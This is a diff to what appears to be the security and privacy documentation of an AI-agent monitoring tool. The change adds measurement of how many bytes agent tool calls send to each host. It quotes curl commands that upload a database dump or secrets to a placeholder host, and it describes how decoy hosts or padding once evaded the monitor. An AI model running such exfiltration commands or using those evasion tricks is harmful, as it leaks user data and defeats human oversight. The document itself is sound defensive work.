@@ -34,9 +34,9 @@ into content it read. The server therefore:
 
 What the server does return is structural metadata of sessions inside those
 roots: tool names (including MCP server and tool names), sub-agent types and
-descriptions, call and error counts, project folder names, session ids and
-**network destinations** — the host names a session's tool calls pointed at
-(see §6).
+descriptions, call and error counts, project folder names, session ids,
+**network destinations** — the host names a session's tool calls pointed at —
+and the **sizes** of what those calls sent, per destination (see §6).
 
 Prompt text is never extracted. Tool inputs and tool outputs are **read but
 not returned**: they are walked for host names only — including, for a shell
@@ -129,36 +129,89 @@ bounds apply, with each argument examined costing one against the 2,000-string
 budget, nesting bounded by the depth limit, and a command line that fails to
 tokenise falling back to a whitespace split rather than raising.
 
-**What is kept.** Only host names, lowercased, with URL credentials, port, path
-and query discarded, and nothing resolved: a name is never turned into an
-address. No argument text, result text, command text, prompt or file content is
-kept at any point. The hosts live on the graph (`seen_domains`) and on the
-calling node, so a report can say which tool reached which host.
+**How much is measured** (since v0.8.0). For a call that named a destination,
+two **sizes** are computed and nothing else:
+
+- **the outbound size**: the UTF-8 size of the call's arguments, serialised as
+  compact JSON with sorted keys — one number, computed the same way for every
+  parser so the same call measures the same whatever log it came from;
+- **how much of it was a declared payload**: for a shell command line, the size
+  of the values of the options that carry a request body
+  (`curl -d`/`--data`/`--data-raw`/`--data-binary`/`--data-urlencode`/`-F`/
+  `--form`/`-T`, `wget --post-data`/`--body-data`, httpie's `key=value`), when
+  the value is literal. The full set is `DATA_OPTIONS` in
+  `agent_certify/domains.py`.
+
+The second is a *part of* the first, not an addition to it: a literal body is
+already inside the argument text that carried it, so it is counted once and
+reported separately. The outbound size is attributed to every destination of
+that call. A call that named no destination is not measured at all.
+
+**What the log cannot show, and what is therefore not claimed.** These are
+sizes *written in a log*, not bytes observed on a network:
+
+- **a file an upload named is not sized.** `curl -T /var/backups/dump.sql host`
+  and `curl -d @dump.sql host` count **zero** payload bytes, because the log
+  holds the file's name and never its size. A ten-gigabyte dump and a
+  ten-kilobyte one produce the same record. Nothing is read from the file
+  system to find out: the tool reads logs. This is a measured blind spot
+  (`file_upload_exfil` in the injection benchmark), not an estimate.
+- **the bytes actually sent are not known.** Compression, chunking, headers,
+  TLS overhead, a retried request, a request that never left the machine: none
+  of that is in a log. The number is a comparable signal about one
+  destination, not an accounting of the wire, and the anomaly says so in its
+  own detail line.
+- **a body built at run time is not sized**: `curl -d "$(cat secrets)"` or a
+  variable expansion carries no literal value. The command is parsed, never
+  evaluated (above), so there is nothing to measure.
+
+**What is kept.** Only host names and **numbers**. Host names lowercased, with
+URL credentials, port, path and query discarded, and nothing resolved: a name
+is never turned into an address. The numbers are byte counts and call counts
+per destination, and counts of calls whose scan hit a limit. No argument text,
+result text, command text, payload, prompt or file content is kept at any
+point — a size is not a sample. The hosts and their numbers live on the graph
+(`seen_domains`, `egress_bytes`, `egress_calls`) and on the calling node, so a
+report can say which tool reached which host and with how much.
 
 **What is stored on disk.** `agent-certify learn` writes every host it saw into
 `known_domains` in `.agent-certify/baseline.json`, alongside the `*.cn`-style
-patterns an operator accepted or rejected. That file is a plain list of host
-names the sessions contacted; treat it like the rest of §5 and review it before
-publishing it. Certificates do **not** carry destinations: `graph_hash()` covers
+patterns an operator accepted or rejected, and — since v0.8.0 — the mean,
+deviation, maximum and session count of the **bytes** each of those hosts
+received (`domain_egress_volume`). That file is a list of host names the
+sessions contacted and four numbers for each; treat it like the rest of §5 and
+review it before publishing it. Certificates do **not** carry destinations: `graph_hash()` covers
 node roles, kinds and links only, which is also why certificates issued before
 v0.7.0 still verify.
 
 **What is transmitted.** When a session reaches a host the baseline never saw,
-or one matching a rejected pattern, the host name appears in the anomaly's
-`message`, `value` and `detail` fields. Those fields are returned verbatim to
+one matching a rejected pattern, or one receiving far more data than usual, the
+host name and the byte count appear in the anomaly's `message`, `value` and
+`detail` fields. Those fields are returned verbatim to
 the MCP client by the `check_anomalies` tool. They also appear in text,
 Markdown, JSON and HTML reports, and in the `message` attribute of an
 `anomaly.*` OTel span event — which, if you export spans, leaves the machine.
 A host name is therefore the one piece of tool-call *content* that can travel
 out of this tool.
 
+**When the scan is cut short.** Reading destinations out of an argument object
+is bounded (200 hosts per call, 2,000 strings per call, 32 levels of nesting,
+10 MB of any one string — the same limit the parsers already apply to a
+record). Reaching a bound is counted on the call and on the graph and reported
+as a `destination_scan_truncated` anomaly, critical when that call did name a
+destination. Before v0.8.0 a host past a bound was dropped in silence, which
+made the bound an evasion: 200 decoy hosts in one command, or a block of
+padding, hid the next one for free. Padding is no longer a bound at all — a
+string is read whole, to the 10 MB limit — and the hosts-per-call bound remains
+but is now published.
+
 **Review rule.** Any feature that reads a new category of input data — a new
 field, a new part of a record, anything beyond the structural metadata listed
 in §1 — requires a review and an update of this document in the same change.
 Network destinations shipped in v0.7.0 without one, and this section is the
-correction. Reading the command line of shell tool calls is the first feature
-to go through it: the paragraph above was written in the same change as the
-code.
+correction. Two features have gone through it since, each documented in the
+change that added it: reading the command line of shell tool calls, and
+measuring the size of what a call sent.
 
 ## Supported versions
 
